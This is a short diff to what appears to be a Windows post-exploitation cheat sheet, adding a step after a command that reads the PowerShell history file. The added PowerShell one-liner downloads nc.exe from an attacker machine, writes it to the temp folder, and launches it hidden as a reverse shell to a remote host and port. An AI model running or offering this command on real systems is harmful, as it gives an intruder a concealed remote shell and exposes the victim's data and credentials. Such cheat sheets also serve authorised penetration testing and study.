@@ -61,3 +61,7 @@ runas.exe
 Powershell history file in environment
 
     cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+drop nc.exe (Netcat) Attacker machine and executes as a background command:
+
+    powershell -Command "$out = Join-Path $env:Temp 'nc.exe'; Invoke-WebRequest -Uri 'http://192.168.1.10/nc.exe' -OutFile $out; Start-Process $out -ArgumentList '192.168.1.65 55522 -e powershell' -WindowStyle Hidden"
